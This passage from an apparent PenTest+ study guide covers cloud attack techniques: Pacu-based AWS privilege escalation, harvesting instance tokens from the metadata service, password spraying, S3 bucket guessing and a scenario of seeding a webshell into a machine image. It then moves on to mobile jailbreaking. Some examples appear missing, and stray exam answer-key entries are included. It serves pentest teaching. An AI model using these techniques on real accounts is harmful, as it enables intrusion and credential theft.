Account and Privilege Attacks

Many organizations move to the cloud for the simplicity of securing their environments. However, it turns out that most cloud providers have a large number of roles to allow users to perform tasks. When things don't work, users often end up with more privileges than are necessary in order to make an easy fix. Additionally, cloud accounts have some of the same weaknesses as corporate accounts because they still use credentials. While cloud providers may offer multifactor authentication for web interfaces, those are not necessarily the most common attack vector.

Most of the time, compromised API-based credential material is to blame for successful cloud attacks. For AWS, this can be SSH keys, access keys, and secrets. For Azure, this can be credentials, keys, or certificates. Google even offers custom authentication methods. But all of these credentials tend to be stored somewhere. Because they are used programmatically, they may not be stored securely, and frequently they end up in places where they shouldn't. Once these are compromised, misconfigurations in identity and access management (IAM) schemes can lead to privilege escalation or account takeover, enabling attackers to gain full administrative access to a cloud account.

Credential Harvesting

Credential harvesting is therefore one of the primary attack vectors for cloud environments. There are different approaches, but one of the most common is to mine source code repositories. In Chapter 2, we touched on using search functions inside GitHub, but cloud attacks are a key area of application for these tactics. Tools such as Gitleaks (https://github.com/zricethezav/gitleaks) and truffleHog (https://github.com/trufflesecurity/truffleHog) probably won't appear on the exam, but they are purpose-built for finding secrets, such as passwords and keys, in Git repositories. Using these secrets to gain initial access to cloud environments or to escalate privileges may be the easiest point of compromise when attacking cloud environments.

Since these credentials are typically used in automated scripts, they aren't always cleaned up as part of commits to repositories. They may be accidentally included and may live in the repository history even if they are caught. Some continuous integration/continuous deployment (CI/CD) pipelines may integrate these search tools into their process out of an awareness of these issues.

In addition to cloud authentication, federated authentication is becoming more common. Federated authentication takes organizational authentication and uses Security Assertion Markup Language (SAML) to create an authentication token, which is fed to the cloud service. This token can then be decrypted and assessed for authentication information by the cloud provider. The information shared from the organization is part of a signed SAML assertion (http://saml.xml.org/assertions).

With federated authentication, corporate credentials become more valuable. There has been an increase in password spraying attacks on Microsoft Azure authentication in 2021 (https://www.secureworks.com/research/undetected-azure-active-directory-brute-force-attacks). These spraying attacks are beneficial because they can get an attacker some level of access within an organization to make privesc, phishing, and other attacks easier.

Privesc

Much as with typical environments, the next step for cloud environments after gaining an initial foothold is to elevate privileges. First, you need to figure out what privileges and roles you have. This is one of the main goals of Pacu (https://github.com/RhinoSecurityLabs/pacu) by Rhino Security Labs. Pacu can help identify cloud resources, misconfigurations, and more. In this example, we'll import some keys that we may have found in an internal repository. We will attempt to use them for privilege escalation.

If Pacu is not installed, the instructions for installing it are in the Pacu GitHub. To begin, we will need to launch Pacu and create a new session to store our data. Each session maintains a database about the information that you uncover. This data can be queried and used to help make decisions for the modules inside Pacu. Pacu is written in Python and only supports AWS for cloud infrastructure. If you have Python version 3.6 or higher and you have pip installed, you can run the command pip install pacu to install the tool.

EXAM TIP Pacu is an open-source Python exploitation framework for AWS cloud environments. You can use it to conduct reconnaissance, privilege escalation, lateral movement, exploitation, and evasion in the cloud. Pacu implements modules to do things like enumerate users, roles, resources, lambda data, and s3 buckets; identify privilege paths and misconfigurations; perform injection; and gain persistence within the cloud.

With Pacu installed, change to the pacu directory and create a new session. In our case, we will make one called ptplus.

Next, import keys. This might be from your AWS credentials file stored in your profile. In Kali, this is in ~/.aws under the credentials file. The name of the credential set is what you import. In this case, we import ptplus keys.

Pacu lists the modules it supports by category. This includes

• Enumeration

• Escalation

• Exfiltration

• Evasion

• Reconnaissance (Recon)

• Exploitation

• Persistence

To list the supported modules, you can use the ls command.

Let's list some basic information about the AWS account so that we can verify the keys are working and we are set up correctly. Modules are run with the run or execute command. If you get stuck, you can use help. Run the aws\_\_enum\_account module.

We have verified that our keys work for access to the instance, and we've completed some basic enumeration. Let's try out some privesc. First, we'll find out what permissions we have by populating the database with the iam\_\_enum\_permissions command. This will list permissions from the IAM service with AWS.

Our ptplus user does have roles. But we only asked Pacu to list information relating to our user—not specific roles. We could have asked it to list roles as well. The iam\_\_privesc\_scan module will run additional checks as required. We don't have to do this here, but running the previous module did tell us that we can list our own privileges. This tells us that we can better identify possible escalation vectors. Without this ability, we would have to resort to other reconnaissance or attack activities to find privesc opportunities.

At this point, we have used Pacu to identify policies that it thinks it can use for privesc. It identifies these as either POTENTIAL or CONFIRMED. Once this identification is complete, Pacu will ask specific questions about the attack option it has identified. In this case, the CreateNewPolicyVersion attack will ask which policy to use. You can simply press ENTER to allow it to choose an ideal one for you.

Now we can enumerate other users and policies to determine what access they have. This information lets us determine additional users, roles, persistence opportunities, and strategies for account takeover.

With enumeration complete, we can use the data command to query information about services, configurations, and more from the Pacu database. In this case, we'll list information about users we were able to discover from the IAM database.

We want to leverage the access we have into IAM and other services to move into some of the compute resources. AWS's Infrastructure as a Service (IaaS) offering is called Elastic Compute Cloud (EC2). EC2 resources may use a resource-specific userdata blob for initial configuration when they are launched. Pacu can query this data and save it to a file for us.

In this case, Pacu has identified one instance that has user data in a blob. But Pacu doesn't have enough information to pull it automatically. It will use the ec2\_\_enum module to gather the data it needs to be able to pull the requested blob.

Now that we have downloaded the data, we can exit Pacu and resume the session later. The data we need will be stored in our local user's directory under ~/.local/share/pacu/\<SessionName\>. Let's run cat on the file and view the user data.

We also have the code the target is using for setting local administrator passwords when systems are booted. Pacu has helped us not only get elevated access in IAM but access to EC2 resources as well. With access to a system, we have additional attack opportunities like getting data from the Metadata service.

The Metadata service (https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) provides information about systems to the systems themselves. When you have access to a system using an attack like the preceding userdata attack, you can query the metadata service in AWS. From an AWS system, you can query the URI http://169.254.169.254/latest/meta-data to see the various options. This is an Amazon-specific IP address. One of the things we can do is get the tokens from the instance. These tokens allow us to take advantage of the rights of the system or service we have compromised.

EXAM TIP AWS user keys typically begin with AKIA, and services begin with ASIA. When you see AKIA, it is a long-term credential, and ASIA is a short-term credential for the service (https://docs.aws.amazon.com/STS/latest/APIReference/API\_GetAccessKeyInfo.html).

TIP If you would like to experiment more with this kind of attack, the flAWS CTF challenge at http://flaws.cloud/ allows you to test this with real AWS configurations.

Account Takeover

Account takeover is a term used to describe someone gaining pervasive access to an account. In essence, the attacker has privileges that are equivalent to the account owner. Typically, this is the result of spear phishing, misconfigured access, or privilege escalation from domain privileges into the cloud. One high-profile incident involving account takeover was the SolarWinds breach at the end of 2020. Attackers added further OAuth certificates into cloud applications, which allowed them to forge credentials in order to maintain elevated privileges (https://www.bankinfosecurity.com/solarwinds-attackers-manipulated-oauth-app-certificates-a-16253).

In addition to attacking OAuth and federation, attacks can create permissive policies that look benign, add certificates or access keys to a user that is controlled by an attacker, or add persistence to applications that have elevated privileges within the account. Malicious policies can be assigned to users or systems, or additional permissions can be added to existing policies. But all of these attacks serve to grant persistent access within the environment, resulting in pervasive access to data and commands. This may go beyond the cloud account itself and into federated applications, cloud assets, hosted data, and network boundaries.

Password Spraying

As with other exposed login interfaces, password spraying attacks will work in the cloud. In many cases, multifactor authentication will be in place and will mitigate these attacks. However, in the case vulnerable cloud interfaces are exposed, password spraying tools designed for common login services may not work. Instead, you may need to use cloud-specific tools for password spraying, such as the Microsoft Online MSOLSpray tool (https://github.com/dafthack/MSOLSpray). Here's an example:

For the exam, it's unlikely you will be asked to have an encyclopedic knowledge of all tools capable of doing this. However, you should be aware that this attack still applies when you are testing assets hosted in the cloud and that you may have to customize your tools to do it during a pentest. Additionally, you should be aware of the impact a spray will have on the service and whether that is allowed according to the hosting provider's pentest policies. But keep in mind that attacking an asset that is hosted in the cloud is not the same as attacking the cloud itself, even though you might ultimately be able to gain access to a cloud-hosted system or even elevate your privileges to the point where you can gain access to attack the cloud infrastructure.

Misconfigured Cloud Assets

Whether it's Software as a Service (SaaS), Platform as a Service (PaaS), or Infrastructure as a Service (IaaS), securing cloud asset configurations can be underwhelmingly simple or overwhelmingly complex. The more sophisticated the platform, the more difficult it may be to secure the platform, and when moving into PaaS or IaaS, complexities can be huge.

Identity and Access Management

IAM consists of the users, groups, roles, and permissions of users and assets within a cloud environment. Permissions are explicit grants of access given to a user, group, or asset. This could be something like being able to access a specific bucket in AWS or the ability to update Blob Storage in Azure.

Roles are designed to roll up permissions so that they can be used across different users, groups, or assets. They are built so that a specific task can be performed. For example, in order to create a new image in the cloud using a tool like Packer, you would need to be able to spin up a machine image, update the image, snapshot the image, and promote it to a new image. This would require a series of permissions. Roles may nest other roles under them to perform that task.

A best practice is to have roles assigned to groups and to place users in the groups. This helps with role-based access control (RBAC). This allows administrators to give people the permissions they need to do their job while being able to update those permissions across all job holders should the requirements for the job change. This is less administratively intensive than having to update each individual user, especially in larger organizations.

Keep in mind that applications and systems may also have permissions. This includes permissions to access other services, to create and destroy files within a data store, and even to update certain cloud configurations. Because this can become very complicated quickly, it's handy to have tooling to help identify problems.

Scout Suite by NCCGroup (https://github.com/nccgroup/ScoutSuite) is one such tool. It can audit accounts in AWS, Azure, Google Cloud, Alibaba, and Oracle Cloud. Scout Suite is written in Python and can be installed by running pip install scoutsuite or by downloading and installing the tool from GitHub. Once installed, typing scout -h will allow you to view options. Let's take a look at our AWS configuration by running scout aws. The output will save to a directory and create an HTML file.

EXAM TIP Scout Suite is a Python tool that can audit accounts in AWS, Azure, Google Cloud, Alibaba, and Oracle Cloud. Scout Suite automatically gathers configuration data and highlights potential risk areas for manual inspection.

Figure 6-1 shows an example of how the resulting HTML file looks when opened in a browser. The main page shows all of the services, while the dashboard shows overall issues pertaining to all the services evaluated. Figure 6-2 shows what happens if we click on the Security pulldown and select IAM to view IAM issues.

Figure 6-1 Scout Suite results, main page

Figure 6-2 Scout Suite IAM dashboard

Our IAM dashboard flags several issues for our attention. Clicking on any of the findings will allow us to view further details so that we can remediate the issues. As an attacker, this is an easy way to dig into areas that may be exploitable to identify potential attack vectors. As a cloud account owner, it's a good practice to run tools like this regularly for proactive efforts at security remediation.

Federation

Earlier in the chapter, we talked about federation as a part of account takeover. Federation takes an identity provider and uses it as the authentication source for an environment. This could be something like Okta (https://www.okta.com/identity-101/what-is-federated-identity), which acts as an authentication source of its own, or it could be integrated into AWS (https://aws.amazon.com/identity/federation), Azure (https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed), or Google Cloud (https://cloud.google.com/architecture/identity/federating-gcp-with-active-directory-introduction).

Federation uses technologies like OAuth (https://oauth.net/2/), SAML (https://auth0.com/blog/how-saml-authentication-works/), or OpenID (https://openid.net/) to act as identity providers that can perform authentication outside of an environment, then return data about the authenticated party so the platform itself can handle authorization. This is typically secured with shared secrets, such as certificates. If those secrets are compromised, then the security of the federation is compromised (https://www.zdnet.com/article/nsa-warns-of-federated-login-abuse-for-local-to-cloud-attacks/). As such, protecting these keys is fundamental to the security of the environment.

Some services allow more than one federated authentication source or multiple keys. Auditing changes to keys, federation sources, or external authentication sources will help protect an environment. As a tester, this is something you should look for but handle carefully. Modifying these settings means protecting the secrets you add and making sure you clean up when you are finished so that you don't degrade the security of your target environment as a result of your testing.

Object Storage

Object storage is one of the most abused cloud components. Frequently, breaches of storage like Amazon S3 are due to misconfigurations. In one case, hundreds of gigabytes of municipal data was accidentally disclosed due to poor S3 hygiene (https://www.securitymagazine.com/articles/95704-us-municipalities-suffer-data-breach-due-to-misconfigured-amazon-s3-buckets). As pentesters, we approach object storage in one of two ways. We can identify storage that is accessible from an unauthenticated point of view, or we can identify storage that is accessible from an authenticated view. Tools like CloudCustodian (https://cloudcustodian.io/) can be used for cloud governance and discovery.

EXAM TIP CloudCustodian is an open-source tool that uses YAML policy files for auditing and enforcing cloud configuration policies in multiple cloud environments, including Azure, AWS, and Google Cloud Platform.

CloudCustodian takes policies in YAML and runs them against an account in order to identify misconfigurations, fix them, and report on potential policy violations. Policies have a name, a resource, and a series of applicable filters. CloudCustodian has sample configurations for AWS, Azure, and Google Cloud. These range from account checks and remediation to VPC checks (https://cloudcustodian.io/docs/aws/examples/index.html). Let's say we want to identify buckets that are not blocking public access. This sample policy will check this.

To run this policy, we can use the run command and the --dry-run option to run the custodian binary. The --dry-run option makes sure that no changes take place. We also use the -s flag to supply an output directory.

In this case, we see two resources. Looking in the output directory, we will see each policy in its own directory based on name, with identified resources inside a resources.json file.

We can see that the test-web bucket has a public access block that does not prevent public access. The policy has PublicReadGetObject allowed for \* to get objects. This means anyone can grab a file from this bucket via the Web. Let's verify that with curl.

We see that we can access the bucket using the naming scheme for web-enabled buckets (\<bucket\>.s3.amazonaws.com). If you know the organization name, you may also be able to use the format: s3-\<region\>.amazonaws.com/\<Org Name\>. We also can verify using the CloudScout output for S3 buckets. When we click on our derp-web bucket, we see the same information we saw in the JSON response, as in Figure 6-3.

Figure 6-3 CloudScout results for S3 buckets

What if we didn't have access? There are many tools designed to guess S3 bucket names. You could use this command in Pacu:

Pacu \> run s3\_\_bucket\_finder -d \<doamain\>

Pacu's s3\_\_bucket\_finder module guesses bucket names based on domain names, subdomains, given affixes, and more. There are other tools that guess buckets based on dictionaries and wordlist manipulation. One of those tools is CloudBrute (https://github.com/0xsha/CloudBrute). CloudBrute supports AWS, Azure, Google Cloud, Digital Ocean, Vultr, Alibaba, and Linode providers. It will attempt to guess buckets based on a key (specified by -k), a wordlist (specified by -w), and a domain or other keywords. Let's try searching for derp.pro. In Figure 6-4, you can see the output.

Figure 6-4 CloudBrute results for ./CloudBrute -d derp.pro -k derp -c amazon -w data/storage\_small.txt

Derp-web doesn't show up. This directory isn't publicly listable. It will only show up if you request the page explicitly, such as with index.html. Storage has access lists and public settings that typically make up the combined access rules. These can be complex if you aren't familiar with them. This is why there have been so many leaks of cloud storage data (https://github.com/nagwww/s3-leaks).

EXAM TIP CloudBrute is a multicloud (Azure, Amazon, Google, etc.) tool that helps identify target infrastructure, files, and applications using wordlists, domains, and common cloud naming conventions.

Containerization Technologies

We will discuss containers a little further in Chapter 7. For now, understand that containers allow you to take an image and run it anywhere. A number of different technologies let us run containers, such as containerd, Windows containers, Docker, Kubernetes, and cloud implementations of these technologies. Most pentesters will need to understand how to recognize, access, and break out of containerized systems. How you leverage container resources to further your access to other systems, or to the hosting system, will be influenced by whether you are able to map local disks on the system from within the container, for example. If directories are mapped that include a Docker socket file, for example, you may be able to issue commands to the container using that file. Additional Docker breakout methods can be found at https://blog.nody.cc/posts/container-breakouts-part1/.

Docker is typically only used for small numbers of containers on a specific host. Docker Swarm is used for orchestration when there are a small number of systems with a small number of services. Kubernetes is better for systems that require orchestration across many nodes, and it offers enterprise-level scalability and resiliency. Docker and Kubernetes share some common attack patterns (such as kernel exploits: https://snyk.io/blog/kernel-privilege-escalation/), but Kubernetes works off of kubelets, users, pods, secrets, and more, which have unique attack vectors. Microsoft has created a list of potential attack, escalation, discovery, and evasion techniques as part of their Threat Matrix for Kubernetes (https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/). Jay Beale of Inguardians has written a walkthrough of some techniques that can be used in a Kubernetes attack on their blog: https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/blog/

Cloud-Centric Attacks

Some attacks, such as DoS, have specialized context when applied to the cloud. Other attacks focus on the nuances of services available only within cloud environments, such as with malware injection and side-channel attacks for cloud resources. Attackers may use these attacks to gain further access within a cloud environment or to use the cloud environment as an attack tool to accomplish goals against other Internet-facing targets.

Denial of Service

In Chapter 3, we talked about DoS attacks in the context of stress testing applications. We talked about the different kinds of attacks and why attackers use them. This ranges from a desire to increase costs, disrupt quality of service, or cause inconvenience for organizations owning the resources or attempting to use them. Motivations may range from monetary (ransom), political or moral activism, or revenge, to using them to mask other attacks. As a pentester, you may also be asked to evaluate whether a cloud environment has weaknesses that allow attackers to use cloud resources for DoS attacks.

Volumetric DDoS

Volumetric attacks try to take up bandwidth or connections on their targets. Cloud resources are an attractive way to amplify an attack or to mask the true source of the attack. The amplification of a reflected attack is the ratio of what is sent to the intermediary versus what is sent to the victim. For example, Memcached is used to store data that can be shared between applications, like web session data. A small request to Memcached can turn into a huge return volume. But as there are fewer Memcached systems on the Internet compared to NTP or SNMP, it may be less attractive as a target. UDP reflection attacks can use protocols like Apple Remote Management Service, Web Services Dynamic Discovery (WS-DD), Constrained Application Protocol (CoAP), LDAP, and Memcached, all of which can be exposed by cloud resources.

Direct-to-Origin Attacks

One of the benefits of cloud-based distributed denial of service (DDoS) prevention is cloud front-ends can massively scale in order to deal with an attack. Only the traffic that has to be passed to back-end systems lands on the origin server itself. With this type of mitigation, there are ideally firewall rules to prevent anyone other than the cloud provider from communicating directly with the origin server. If these rules don't properly protect origin servers, attackers may be able to issue requests that reveal back-end IP addresses for the systems being protected (https://cdn.net/how-to-protect-your-cdn-origin-server/).

If real IPs are revealed, attackers can bypass protections and attack IP addresses directly. This is a direct-to-origin attack. Content delivery networks (CDNs) are designed to shoulder the bulk of the load. Massive amounts of traffic can therefore be serviced by relatively few systems. Attacking those few directly can quickly overload the target. The cached content in the CDN will still be serviced, but dynamic content can't be generated and distributed. This would be things like logins, searches, and more (https://www.red-button.net/ddos-glossary/direct-to-origin-ddos-attacks/).

We talked about how to conduct reconnaissance for this in Chapter 2, but let's revisit this for a moment. Look up the website by name to get its IP. Look up the IP and see who owns it in ARIN. If it's a cloud provider, it could be a cloud-fronted site. You could instead make requests to a bogus virtual host address—let's say, "doesnotexist.derp.pro"—and see if you get a response from a different IP range. You could even look up the IP range your target organization owns and request the domain name. For example, send this request to the IP address target in Burp (https://\<company owned IP address from ARIN\>):

If the response comes back as a valid web response with a base page, you know you've made a direct request. You can also examine SSL certificates to identify IP addresses that may be vhosts in use. Some tools exist to help automate this process, but may not show up on the exam:

• https://github.com/jobertabma/virtual-host-discovery

• https://github.com/gwen001/vhost-brute

• https://github.com/m0rtem/CloudFail

TIP For further reading about some of the research into these types of attacks, check out these articles at ZDnet (https://www.zdnet.com/article/fbi-warns-of-new-ddos-attack-vectors-coap-ws-dd-arms-and-jenkins/) and Team Cymru's blog (https://team-cymru.com/blog/2020/05/15/dissecting-ddos-attacks/).

Cloud Malware Injection

In Chapter 5, we talked about application injection attacks and how attackers can use XSS and SQLi attacks to inject malicious content into what is served by legitimate applications. These attacks also work in the cloud. However, there are additional vectors of attack for malware injection in the cloud. In the cloud, attackers may be able to use the access acquired through other attacks to inject malicious content into served images or cloud services.

For example, if an attacker is able to manipulate a copy of a legitimate cloud-hosted service or machine image and then convince the cloud provider that copy should be served, they could gain additional access to the cloud environment or even intercept service requests meant for the legitimate service. In a SaaS or PaaS model, this means using a service. In an IaaS model, this means affecting served images. In both cases, this involves having some level of privileged access to the cloud account. But this may be acquired as a result of other attacks. Let's look at a plausible example.

Assume during our testing that we identify an abandoned GitHub repository maintained by the target organization. It looks like a number of scripts within the repository are used either as examples of how to manage the services the organization offers or to perform the management. Using a tool like truffleHog, we can look for keys. Let's say we find a key in a commit from more than a year ago. It's since been removed from the repository, but the history file has not been cleaned. Testing the key, we find out that it works, and the key grants access to the organization, but without enough permissions to do what we want. We have EC2:\* privileges, though. This lets us enumerate the EC2 instances and find the AMI that was used to create them. To take a closer look, we can spin up a new instance with that AMI using our own keys, connect to it, and find that it is using AWS Secrets Manager to get credentials for communication to other services. Since we don't have enough privileges to grant permissions to the new instance, it can't access these secrets. Bummer, right? We need to get creative. We look and find that the AMIs use a naming scheme: WebService-Master-MM-YY. It's possible that services pull the latest image based on this naming scheme. So, we modify our AMI to add a hidden webshell for remote access and throw in a privilege escalation binary so that we can take over the system. Then we save it to a new AMI using the same naming scheme. We wait, and eventually we see that the service has launched our malicious AMI. We can use our webshell to get into it, elevate privileges, and sift through the running processes to access the credentials from AWS Secrets Manager. Those secrets allow us to access the RDS instance and get access to sensitive data that we could not use before.

Attackers could use this to exploit users of the cloud service with something like a drive-by attack, intercept other sensitive data sent to the service, or plant additional malware to abuse resources hosted in the cloud environment. This type of attack can be difficult to spot, because it relies heavily on integrity management of images and services, as well as protecting cloud secrets. While there's a lot of attention on the latter, good controls for integrity management are less often considered.

Side-Channel Attacks

One of the reasons the cloud is popular is because of its scalability. Affordable scalability is the result of multitenancy. That means many customers may be running isolated images using the same physical hardware. Since the CPUs are still the same and some of the hardware is shared, side-channel attacks may take advantages of weaknesses in hardware to capture information from other instances. Two prominent examples of this are Spectre and Meltdown (https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html). Using these weaknesses, attackers may be able to read kernel memory and system caches and perhaps access information of other instances. Keys, certificates, credentials, processed data, and other information may be leaked from shared systems. There are numerous scholarly papers about side-channel attacks (http://dx.doi.org/10.1145/2660267.2660356 for example); however, these attacks are difficult to execute, and the data returned is not always predictable.

Software Development Kits

Cloud-based software development kits (SDKs) include command-line interfaces (CLIs) to interact with the cloud. Amazon implements awscli. Google Cloud Platform (GCP) implements the gcloud tool. Azure has the az tool. These may also include various other libraries to help interact with services. Most cloud infrastructures can be accessed programmatically. Here's an example of using PowerShell to look up automation accounts and runbooks and export them in Azure:

This can also be done using an Azure SDK written for Python (https://github.com/Azure/azure-sdk-for-python).

In addition, many organizations are going the route of using Infrastructure as Code (IaC). IaC allows organizations to programmatically define how to build instances and architectures in the cloud so that they can be consistent, scalable, reusable, and well defined. Some of the tools that make up IaC include Chef, Puppet, Ansible, SaltStack, Terraform, CloudFormation, Packer, Vagrant, Docker, and Kubernetes. We could probably dedicate the entire space of a book to these technologies, and you should certainly use the opportunity to research these independently in order to become a great pentester, if you choose to focus on cloud technologies. What you need to know is that using these tools provides a programmatic way to use cloud SDKs from within other tooling.

Using code to set up configuration files to build a cloud-based infrastructure and then perform prebuild, deployment, and post-deployment tasks to customize the resulting images has three advantages. As tooling is updated, this makes it much easier to upgrade, redeploy, scale, and destroy environments as necessary. It becomes easier for DevOps methodologies to use these tools to better include cloud in CI/CD pipelines, where code can be constantly updated as new features are added so that environments can be scaled, upgraded, and rolled back as needed. And these tools make it easier to transform environments from one provider to another, since the actual infrastructure is abstracted.

What does this mean to a pentester or an attacker? These are all powerful tools, but they must be run from somewhere. This means that keys, secrets, configurations, and the data these tools use must also reside somewhere. This makes targeting this information a potential operational goal. Confirm that this information is adequately protected by looking in internal and external code repositories to minimize unintentional exposures. Target systems that handle CI/CD pipelines and make sure they do not grant access to all of the cloud repositories, including the ability to spin up new instances, capture keys for privilege escalation, or gain persistence. Tools like CyberArk, HashiCorp Vault, AWS Secrets Manager, and GCP Secrets Manager all help manage secrets. Google has some good recommendations for secrets management (https://cloud.google.com/secret-manager/docs/best-practices), but users who fail to follow this guidance or leak additional keys may also leave secrets management vulnerable. Therefore, pentesting will focus on finding weaknesses in the implementation of policies and practices designed to protect this information throughout the provisioning and management process, especially when cloud SDKs and CI/CD are involved.

Chapter Review

As you can see, the cloud is its own specialty area for pentesting. It requires its own set of tools and knowledge to perform pentests against it successfully. In this chapter, we've reviewed cloud-centric considerations for account and privilege attacks, giving an overview of where common pentest concepts have specific application within the cloud. We looked at cloud configuration concepts to give a context for cloud management, reconnaissance, and exploitation during pentests, and we discussed attack permutations that are specific to cloud environments. Cloud pentesting often requires custom tooling, so we have provided a few scenarios to familiarize you with some of these, such as Pacu, CloudBrute, Cloud Custodian, and Scout Suite. But there is plenty of room for you to research further to become a true cloud pentest expert.

3. A. Pacu implements modules, and the enum module that focuses on the AWS account details is aws\_\_enum\_account.

4. C. The metadata service will allow you to get the instance's tokens, but it won't necessarily enable you to perform the other actions mentioned. Even though you may have privileges to do some of these, you wouldn't necessarily use the metadata service to do that.

5. B. Getting back the legitimate website by requesting the direct IP suggests you have successfully requested directly to the origin server when the IP you requested is not owned by another organization (such as a cloud mitigation provider). Load balancers and other equipment may perform a redirect or serve error pages rather than the expected web content.

CHAPTER 7

Specialized and Fragile Systems

In this chapter, you will learn about

• Common attacks and vulnerabilities for specialized systems

• Mobile attacks, vulnerabilities, and tools

• Special considerations, vulnerabilities, and attacks for Internet of Things (IoT) and SCADA systems

• Data storage system vulnerabilities for on-premises and cloud configurations

• Vulnerabilities that apply to virtualized and containerized environments

Specialized systems, including mobile, IoT, SCADA, and virtualized/containerized systems, have revolutionized the way people interact with each other and the Internet. Most tasks that required a home computer like e-mail, online banking, video chat, or watching movies can now be done from the convenience of a tablet or smart phone through mobile software applications. Automation for everything from factories to agriculture can now be managed over a network. With virtualization and containerization, enterprises have forever changed the paradigm for systems management and portability.

What each of these has in common is device specialization. These devices serve dedicated purposes and often operate under constraints that differentiate them from traditional devices. This could be a need to run for prolonged periods on battery power, to accommodate a smaller form factor, to conform to other industrial operating conditions, or to accommodate the operating parameters of providing an entirely virtualized stack. In turn, the operating systems and software are often customized to match. This means that traditional penetration testing methods that rely on OS-level access or that follow the rules of traditional networks may not apply in quite the same ways.

In this chapter, we will discuss some of the concepts you may see on the CompTIA PenTest+ exam regarding mobile systems, virtualized devices, and other nontraditional systems at a high level. Please note, this is a wide area of expertise, and we will not be able to cover every aspect of this type of pentesting within the scope of a single book chapter. To prep for the exam, we highly recommend using the resources provided in this chapter for further reading.

Mobile Devices

When we talk about mobile devices, we're typically talking about phones and tablets. The hardware is customized for a handheld form factor, long battery life, limited local storage, and security features that facilitate wireless and cellular communication. Generally, these devices will run either Android or iOS operating systems. Android is an open-source operating system, but iOS is proprietary. In either case, pentests tend to focus on security of local device storage, authentication and authorization, the ways applications interact with each other and the OS, communications, and anti-tampering or anti-reversing controls that exist on the device.

NOTE For more information about the Apple mobile platform's hardware and its security model, check out the 2021 Apple Platform Security guide: https://manuals.info.apple.com/MANUALS/1000/MA1902/en\_US/apple-platform-security-guide.pdf. Similarly, you can read more about the Android platform at https://developer.android.com/training/articles/security-tips.

Testing Concepts

Before we go into details about specific mobile operating systems, there are a few concepts that mobile testing platforms have in common. Mobile testing provides challenges not only surrounding what testing tools you use but how you install testing tools and applications, how you access devices, and even what environment you are able to use to perform your testing. We'll talk about these in terms of four key concepts, including application sideloading, jailbreaks, emulators and simulators, and special test hardware.

Sideloading

Most mobile ecosystems limit application installation to a store. The Apple Store, as an example, is the only way to install an application on an iOS device. Android implements Google Play. If you need to test an application that isn't available in these stores, you will either need to modify the device to allow sideloading (Android), or you will need special privileges, either as a developer or on the device itself (iOS). Sideloading is the process of installing applications that are unapproved for the device or that come from a source that is unapproved. For mobile devices, sideloading is typically accomplished via USB.

Jailbreaks

Without privileged operating system access, you can't rely on logs, process monitoring, or other inputs you might normally have in order to evaluate functionality. You may not be able to install applications or other custom tooling. These limitations also prevent you from evaluating encrypted code or communications. Pentesting these devices often means working around that.

Jailbreaking, or "rooting," is the process of exploiting a software vulnerability in a mobile OS that enables low-level execution with elevated privileges (i.e., root) to bypass the security mechanism in a mobile OS. Jailbreaking a device is useful when you do not have another way to sideload an application or need device-level access to evaluate application security. Both Android and Apple devices can be jailbroken, but available jailbreaks change over time. There are four classifications of jailbreaks:

• Untethered The device can be powered on and off without the help of a computer.

• Tethered A computer and software are required to boot the jailbroken device each time.

• Semi-tethered If the device is rebooted, you will need to jailbreak the device again to patch the kernel using a computer.

• Semi-untethered This is the same as semi-tethered but can be accomplished using the jailbreak app that is already installed on the device.

How you jailbreak a device varies based on the device and operating system version. While there are some online-only jailbreaks (for example, see https://www.theiphonewiki.com/wiki/Jailbreak\_Exploits), in most cases, you must sideload a jailbreak application to the device. For mobile devices, this is typically done via USB. Once you run the jailbreak, you will be granted privileged access to the device. But this is not foolproof. You always run the risk of rendering the device unusable, or "bricking" it. Therefore, it is advisable that you use a dedicated test device rather than your personal device for testing.

An important consideration, if you do jailbreak a device, is the process of jailbreaking changes the security of the device. This process may enable services that are not normally enabled or set default passwords that can be exploited by network attackers who can see a jailbroken device. Be especially cognizant of these changes while testing, and be sure to secure the device yourself rather than introducing a customer to the risk of data loss or compromise as a result of your actions. This may also mean that finding other jailbroken devices within your client's scope could be a valid target for you during your pentest. Fun!

NOTE iOS Jailbreaking is discussed in detail in this SANS blog post series: https://www.sans.org/blog/checkra1n---part-1---prep/. To learn more about other types of jailbreaks or get help with jailbreaking your devices, check out the iOS Jailbreak subreddit: https://www.reddit.com/r/jailbreakandtheAndroidRoot subreddit: https://www.reddit.com/r/androidroot/

Emulators and Simulators

Another alternative to jailbreaking or rooting a device is to use an emulator or a simulator. Apple's XCode is an integrated development environment (IDE) that includes the Apple software development kit (SDK) containing tools for iOS development, as well as a simulator for iOS. Android's SDK also includes an emulator. The difference between an emulator and a simulator is that an emulator will mimic the hardware and operating system for the application being tested, but a simulator will only mimic the software environment. When testing the security of a mobile application or operating system, you may want to make sure you are using the real thing or something close to the original to ensure your results.

CAUTION The biggest benefit to using an emulator or simulator versus an actual device is that if the emulator virtual machine breaks, you can start another one. If you brick the hardware device, it likely won't be so easy to recover. As an added precaution, always remember to back up your data first before rooting or jailbreaking the device.

Test Hardware

Due to the extensive hardware-based controls on Apple devices, Apple provides an Apple Security Research Device (SRD) for researchers. Apple SRD is designed to allow researchers to test iOS without having to defeat its protection mechanisms. It allows sideloaded content and runs it with platform-equivalent permissions. This uses variant boot software that will not run on consumer hardware. However, these devices are only available through a tightly controlled program (https://developer.apple.com/programs/security-research-device/).

Mobile Hardware

Most mobile pentesting will focus on applications and peripheral connectivity. However, it's worth understanding some device basics. The platform's hardware determines what authentication features are available, such as what cameras and touch sensors are available for biometric identification controls, encryption engines, storage, user input, and external device connectivity.

Mobile devices are typically built with a system on a chip (SoC). The SoC is a small, integrated circuit that connects together common components that make up a mobile device, such as the CPU, GPU, RAM, ROM, and modem. For cellular communications, a SIM (subscriber identity module) card is unique and required in order to identify and authenticate a user's device on the cellular network. Once authenticated, the user's communications are encrypted. Setting a SIM personal identification number (PIN) on the mobile device can help protect your data in the event the device is lost or stolen.

